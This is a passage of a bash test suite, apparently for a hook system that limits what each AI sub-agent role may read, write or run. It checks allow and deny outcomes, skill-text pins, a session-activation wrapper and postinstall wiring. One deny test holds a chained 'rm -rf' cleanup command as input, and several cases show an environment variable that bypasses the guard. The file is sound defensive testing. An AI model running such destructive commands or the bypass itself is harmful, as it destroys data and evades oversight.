assert_deny "$KERNEL" "$(payload tool_name=Bash command='npx playwright-cli close-all; rm -rf /tmp/x' cwd="$KP")" \
  "cleanup chained to rm -rf → DENY" "may not run this command"
# The workers may drive their own session but may not reap their
# siblings' — the parent owns global teardown (playwright-cli-protocol
# §3.2 / the reviewer contract's \"Do NOT run close-all\").
assert_allow "$KERNEL" "$(sub tool_name=Bash agent_type=reviewer command='npx playwright-cli -s=reviewer-j-login-4-c1 open --browser=chromium http://localhost:3000')" \
  "reviewer opens its own playwright-cli session → ALLOW"
assert_deny "$KERNEL" "$(sub tool_name=Bash agent_type=reviewer command='npx playwright-cli close-all')" \
  "reviewer runs close-all → DENY (the parent owns global teardown)" "explicitly denied"
assert_deny "$KERNEL" "$(sub tool_name=Bash agent_type=probe command='npx playwright-cli kill-all')" \
  "probe runs kill-all → DENY (same rule)" "explicitly denied"

# ---------------------------------------------------------------------------
section "kernel wiring: composing is the job; scaffolder and approvers keep their files"
# ---------------------------------------------------------------------------
# Composing is the job, and the role that OWNS the page
# repository still writes it.
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=test-composer file_path="$KP/tests/e2e/checkout.spec.ts" content='import { test } from "@playwright/test"; test("x", async () => {});')" \
  "test-composer Write a spec → ALLOW (the ledger deny is scoped to one file)"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=scaffolder file_path="$KP/tests/e2e/page-repository.json" content='{"pages":{}}')" \
  "scaffolder Write the page repository → ALLOW (unchanged: it is that role's deliverable)"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=workflow-reviewer file_path="$KP/tests/e2e/docs/onboarding-status.json" content='{}')" \
  "workflow-reviewer Write the status ledger → ALLOW (unchanged: approvers own the verdict)"
# The in-pipeline workers inherit the same discipline.
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=probe file_path="$KP/tests/e2e/docs/adversarial-findings.md" content='# findings')" \
  "probe Write the adversarial-findings ledger → ALLOW (its own deliverable)"
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=probe file_path="$KP/tests/e2e/docs/onboarding-status.json" content='{}')" \
  "probe Write the status ledger → DENY" "explicitly denied write"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=reviewer file_path="$KP/tests/e2e/docs/.subagent-returns/reviewer-j-login-4-c1.md" content='x')" \
  "reviewer Write its spillover file → ALLOW"
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=reviewer file_path="$KP/tests/e2e/docs/adversarial-findings.md" content='x')" \
  "reviewer Write the adversarial ledger → DENY (Stage B never appends)" "outside the role's write scope"
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=stage2 file_path="$KP/tests/e2e/page-repository.json" content='{}')" \
  "stage2 Write the page repository → DENY (it RETURNS proposed entries)" "outside the role's write scope"
assert_allow "$KERNEL" "$(sub tool_name=Write agent_type=phase4 file_path="$KP/tests/e2e/docs/journey-map.md" content='<!-- journey-mapping:generated -->')" \
  "phase4 Write the journey map → ALLOW (phase4-prioritise-author is its only legitimate author)"
assert_deny "$KERNEL" "$(sub tool_name=Write agent_type=phase4 file_path="$KP/tests/e2e/checkout.spec.ts" content='x')" \
  "phase4 Write a spec → DENY (discovery and authoring are different mandates)" "outside the role's write scope"

# ---------------------------------------------------------------------------
section "kernel wiring: every shipped skill is granted to some role"
# ---------------------------------------------------------------------------
# A glob, not `find -printf` (BSD find rejects it); the count assert below pins
# that the bijection runs over a non-empty list.
SKILL_DIRS=$(for d in "$REPO_ROOT"/skills/*/; do basename "$d"; done | sort)
assert_eq "$(printf '%s\n' "$SKILL_DIRS" | grep -cx achilles-protocol)" "1" "skill directories are enumerated (not an empty list)"
UNGRANTED=$(comm -23 \
  <(printf '%s\n' "$SKILL_DIRS") \
  <("$JQ" -r '[.roles[].skills.allow // []] | flatten | .[]' "$MANDATE" | sort -u) | tr '\n' ' ' | sed 's/ $//')
assert_eq "$UNGRANTED" "" "every shipped skill directory appears in at least one role's skills.allow"

# ---------------------------------------------------------------------------
section "drift pins: skill text the kernel cases depend on"
# ---------------------------------------------------------------------------
# Text pins, not behaviour: they fail when a skill stops teaching the shape the cases above dispatch.
pin() { # <file> <literal> <count> <name>
  assert_eq "$(grep -cF -- "$2" "$REPO_ROOT/$1")" "$3" "$4"
}
pin skills/coverage-expansion/SKILL.md '### Grouped dispatch' 1 "coverage-expansion SKILL.md is the canonical home for the role-first group grammar"
pin skills/onboarding/SKILL.md 'test-composer-group-<id>: j-a, j-b' 1 "onboarding SKILL.md's dispatch grammar shows the role-first group spelling"
pin skills/test-composer/SKILL.md '<<kernel-mandate-role: test-composer#<nonce>>>' 1 "test-composer SKILL.md teaches the test-composer binding tag"
pin skills/test-composer/SKILL.md 'description: test-composer-j-<slug>: <task>' 1 "test-composer SKILL.md teaches the test-composer-j-<slug>: description"
pin skills/onboarding/SKILL.md 'secrets-sweep-phase7:' 1 "onboarding Phase 7 teaches the secrets-sweep-phase7: description"
pin skills/secrets-sweep/SKILL.md 'secrets-sweep-phase7:' 2 "secrets-sweep SKILL.md teaches the secrets-sweep-phase7: description"
pin skills/workflow-reviewer/SKILL.md '<<kernel-mandate-role: workflow-reviewer#<nonce>>>' 1 "workflow-reviewer SKILL.md teaches the workflow-reviewer binding tag"
pin skills/perf-onboarding/SKILL.md '<<kernel-mandate-role: perf-reviewer#<nonce>>>' 1 "perf-onboarding SKILL.md teaches the perf-reviewer binding tag"
pin skills/coverage-expansion/references/process-validator-workflow.md '<<kernel-mandate-role: process-validator#<nonce>>>' 1 "process-validator-workflow.md teaches the process-validator binding tag"
pin hooks/workflow-reviewer-brief-gate.sh '<<kernel-mandate-role: workflow-reviewer#<nonce>>>' 1 "the reviewer brief gate's fix template opens with the binding tag"
# The old literal may survive only in the sentence that retires it (the
# line names it "pre-kernel"); anywhere else it is a dispatch instruction
# the kernel would refuse.
assert_eq "$(grep -rhF -- '`composer-j-<slug>:`' "$REPO_ROOT/skills/onboarding" "$REPO_ROOT/skills/coverage-expansion" "$REPO_ROOT/skills/test-composer" "$REPO_ROOT/skills/workflow-reviewer" "$REPO_ROOT/skills/bug-discovery" "$REPO_ROOT/skills/secrets-sweep" 2>/dev/null | grep -vc 'pre-kernel' | tr -d ' ')" "0" \
  "no dispatching skill still teaches the pre-kernel \`composer-j-<slug>:\` description (outside the sentence retiring it)"

# ---------------------------------------------------------------------------
section "wrapper: dormant without a session marker, consults the kernel with one"
# ---------------------------------------------------------------------------
export ACHILLES_SESSION_STATE_DIR="$KW_TMP/sessions"
mkdir -p "$ACHILLES_SESSION_STATE_DIR"
DEV_TRANSCRIPT="$KW_TMP/dev-transcript.jsonl"
cat > "$DEV_TRANSCRIPT" <<'EOF'
{"type":"user","message":{"content":[{"type":"text","text":"tidy the README"}]}}
{"type":"assistant","message":{"content":[{"type":"tool_use","name":"Bash","input":{"command":"git status"}}]}}
EOF
# The one call the kernel would refuse for the orchestrator — used as the
# probe throughout so the only variable is whether the kernel was asked.
probe() { payload session_id="$1" transcript_path="$DEV_TRANSCRIPT" tool_name=Read file_path="$KP/src/app.ts" cwd="$KP"; }

assert_allow "$H" "$(probe km-dev-1)" "dev session (no marker, no signal): wrapper → silent ALLOW (dormant)"
assert_deny "$KERNEL" "$(probe km-dev-1)" "…while the raw kernel would DENY the same call (manifest is live on disk)" "outside the role's read scope"

activate_session km-act-1
assert_deny "$H" "$(probe km-act-1)" "marker present: wrapper relays the kernel's DENY" "outside the role's read scope"
assert_allow "$H" "$(payload session_id=km-act-1 transcript_path="$DEV_TRANSCRIPT" tool_name=Read file_path="$KP/package.json" cwd="$KP")" \
  "marker present: in-scope Read relays the kernel's ALLOW"
export ACHILLES_PROTOCOL=0
assert_deny "$H" "$(probe km-act-1)" "ACHILLES_PROTOCOL=0 cannot deactivate a live marker → still DENY (one-way lifecycle)" "outside the role's read scope"
assert_allow "$H" "$(probe km-dev-2)" "ACHILLES_PROTOCOL=0 suppresses activation for a fresh session → ALLOW"
unset ACHILLES_PROTOCOL
export KERNEL_MANDATE=0
assert_allow "$H" "$(probe km-act-1)" "KERNEL_MANDATE=0 (operator shell) bypasses through the wrapper → ALLOW"
unset KERNEL_MANDATE

# Activation on the very first protocol-shaped call: the wrapper sees the
# Skill invocation, marks the session, and consults the kernel for it.
assert_allow "$H" "$(payload session_id=km-act-2 transcript_path="$DEV_TRANSCRIPT" tool_name=Skill skill=onboarding cwd="$KP")" \
  "first protocol-shaped call (Skill onboarding) → kernel consulted → ALLOW"
assert_eq "$([ -f "$ACHILLES_SESSION_STATE_DIR/km-act-2.active" ] && echo marked || echo unmarked)" "marked" \
  "…and the session is now marked active"
assert_deny "$H" "$(probe km-act-2)" "…so the next out-of-scope call is DENIED" "outside the role's read scope"

# Missing session identity fails closed (guards on) — the kernel is asked.
assert_deny "$H" "$(payload tool_name=Read file_path="$KP/src/app.ts" cwd="$KP")" \
  "no session_id: fail-closed → kernel consulted → DENY" "outside the role's read scope"

# Kernel script absent beside the wrapper while a manifest is staged → refused (case 87 holds the no-manifest allow).
NOK="$KW_TMP/hooks-without-kernel"
mkdir -p "$NOK/lib"
cp "$H" "$NOK/"
cp "$HOOK_DIR"/lib/hook-io.sh "$HOOK_DIR"/lib/hook-emit.sh "$HOOK_DIR"/lib/achilles-activation.sh "$HOOK_DIR"/lib/dispatch-prefix.sh "$NOK/lib/"
assert_deny "$NOK/achilles-kernel-activation-gate.sh" "$(probe km-act-1)" \
  "marker present, manifest staged, kernel script missing → DENY" "kernel-mandate cannot run"

# A global install stages the mandate as <claude>/achilles-qa.kernel-mandate.json beside its hooks dir.
unset KERNEL_MANDATE_MANIFEST
GLOBAL_CLAUDE="$KW_TMP/ghome/.claude"
mkdir -p "$GLOBAL_CLAUDE/hooks" "$KW_TMP/bare/src" "$KW_TMP/own/.claude" "$KW_TMP/own/src"
cp "$H" "$KERNEL" "$GLOBAL_CLAUDE/hooks/"
cp -R "$HOOK_DIR/lib" "$HOOK_DIR/data" "$GLOBAL_CLAUDE/hooks/"
cp "$MANDATE" "$GLOBAL_CLAUDE/achilles-qa.kernel-mandate.json"
echo '{"kernelMandateVersion":1,"name":"own","roles":{}}' > "$KW_TMP/own/.claude/kernel-mandate.json"
assert_deny "$GLOBAL_CLAUDE/hooks/achilles-kernel-activation-gate.sh" \
  "$(payload session_id=km-act-1 transcript_path="$DEV_TRANSCRIPT" tool_name=Read file_path="$KW_TMP/bare/src/app.ts" cwd="$KW_TMP/bare")" \
  "global install, project without a manifest: the staged global mandate governs → DENY" "outside the role's read scope"
assert_allow "$GLOBAL_CLAUDE/hooks/achilles-kernel-activation-gate.sh" \
  "$(payload session_id=km-act-1 transcript_path="$DEV_TRANSCRIPT" tool_name=Read file_path="$KW_TMP/own/src/app.ts" cwd="$KW_TMP/own")" \
  "global install, project with its own manifest: the project's manifest governs → ALLOW"
assert_allow "$GLOBAL_CLAUDE/hooks/achilles-kernel-activation-gate.sh" \
  "$(payload session_id=km-dev-3 transcript_path="$DEV_TRANSCRIPT" tool_name=Read file_path="$KW_TMP/bare/src/app.ts" cwd="$KW_TMP/bare")" \
  "global install, inactive session: dormant → ALLOW"

unset KERNEL_MANDATE_MANIFEST KERNEL_MANDATE_STATE_DIR ACHILLES_SESSION_STATE_DIR

# ---------------------------------------------------------------------------
section "postinstall: wires the wrapper, refreshes the kernel companion, stages the QA mandate once"
# ---------------------------------------------------------------------------
if require_tool node; then
  WIRE_TEST=$(mktemp "$KW_TMP/wiring-XXXXXX.mjs")
  WIRE_HOME="$KW_TMP/home"
  WIRE_PROJ="$KW_TMP/consumer"
  mkdir -p "$WIRE_HOME/.claude/hooks" "$WIRE_PROJ"
  cat > "$WIRE_TEST" <<EOF
import { strict as assert } from 'assert';
import fs from 'fs';
import path from 'path';
import { createRequire } from 'module';
const home = '$WIRE_HOME';
const proj = '$WIRE_PROJ';
const userHooks = path.join(home, '.claude', 'hooks');
const settingsPath = path.join(home, '.claude', 'settings.json');
// An upgraded install with a stale kernel on disk. The stale kernel predates
// the package (copyHookFile copies on mtime), as on any real upgrade —
// backdate the stub or the test would be testing the mtime rule instead of
// the companion copy.
const staleKernel = path.join(userHooks, 'kernel-mandate-role-gate.sh');
fs.writeFileSync(staleKernel, '#!/bin/bash\nexit 0\n');
const past = new Date(Date.now() - 7 * 24 * 3600 * 1000);
fs.utimesSync(staleKernel, past, past);
process.env.HOME = home;
process.env.CIVITAS_SKIP_JQ_INSTALL = '1';
delete process.env.CIVITAS_SKIP_HOOK_INSTALL;
const require = createRequire(import.meta.url);
const pi = require(path.join('$REPO_ROOT', 'scripts', 'postinstall.js'));

// --- hooks: wrapper registered, kernel copied as an unregistered companion
pi.installCivitasHooks();
const after = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
const star = after.hooks.PreToolUse.filter(g => g.matcher === '.*');
const starCmds = star.flatMap(g => (g.hooks || []).map(h => h.command));
assert.ok(starCmds.some(c => c.endsWith('achilles-kernel-activation-gate.sh')), 'wrapper registered on PreToolUse:.*');
const allCmds = after.hooks.PreToolUse.flatMap(g => (g.hooks || []).map(h => h.command));
assert.ok(!allCmds.some(c => c.endsWith('kernel-mandate-role-gate.sh')), 'kernel not registered');
const kernelOnDisk = path.join(userHooks, 'kernel-mandate-role-gate.sh');
assert.ok(fs.existsSync(kernelOnDisk), 'kernel still on disk (companion)');
assert.ok(fs.statSync(kernelOnDisk).size > 1000, 'companion copy is the real kernel, not the stub');
assert.ok(fs.existsSync(path.join(userHooks, 'lib', 'kernel-mandate.sh')), 'kernel lib copied');
assert.ok(fs.existsSync(path.join(userHooks, 'data', 'achilles-qa.kernel-mandate.json')), 'hooks/data manifest copied');

// --- staging: lands only when absent
const dest = path.join(proj, '.claude', 'kernel-mandate.json');
assert.ok(!fs.existsSync(dest), 'precondition: no manifest in the project');
pi.stageProjectMandate(proj);
assert.ok(fs.existsSync(dest), 'manifest staged into <project>/.claude/');
const shipped = fs.readFileSync(path.join('$REPO_ROOT', 'hooks', 'data', 'achilles-qa.kernel-mandate.json'), 'utf8');
assert.equal(fs.readFileSync(dest, 'utf8'), shipped, 'staged bytes == shipped bytes');
// nothing outside the project
assert.ok(!fs.existsSync(path.join(home, '.claude', 'kernel-mandate.json')), 'nothing staged under HOME');

// --- never overwrites
const custom = '{"kernelMandateVersion":1,"name":"custom","roles":{}}\n';
fs.writeFileSync(dest, custom);
pi.stageProjectMandate(proj);
assert.equal(fs.readFileSync(dest, 'utf8'), custom, 'existing manifest left byte-for-byte alone');

// --- honours the hook-install opt-out (no hooks → no kernel → nothing to bind)
const proj2 = path.join('$KW_TMP', 'consumer-skip');
fs.mkdirSync(proj2, { recursive: true });
process.env.CIVITAS_SKIP_HOOK_INSTALL = '1';
pi.stageProjectMandate(proj2);
assert.ok(!fs.existsSync(path.join(proj2, '.claude', 'kernel-mandate.json')), 'not staged under CIVITAS_SKIP_HOOK_INSTALL=1');
console.log('WIRING_OK');
EOF
  TESTS_RUN=$((TESTS_RUN + 1))
  WIRE_OUT=$(HOME="$WIRE_HOME" node "$WIRE_TEST" 2>&1 || true)
  if echo "$WIRE_OUT" | grep -q 'WIRING_OK'; then
    TESTS_PASSED=$((TESTS_PASSED + 1))
    echo "${CLR_PASS}  ✓${CLR_RST} postinstall wires the wrapper, refreshes the kernel companion, stages the mandate once and never overwrites"
  else
    TESTS_FAILED=$((TESTS_FAILED + 1))
    FAIL_DETAILS+=("postinstall kernel wiring: ${WIRE_OUT:0:400}")
    echo "${CLR_FAIL}  ✗${CLR_RST} postinstall kernel wiring ${CLR_DIM}(${WIRE_OUT:0:160})${CLR_RST}"
  fi
fi

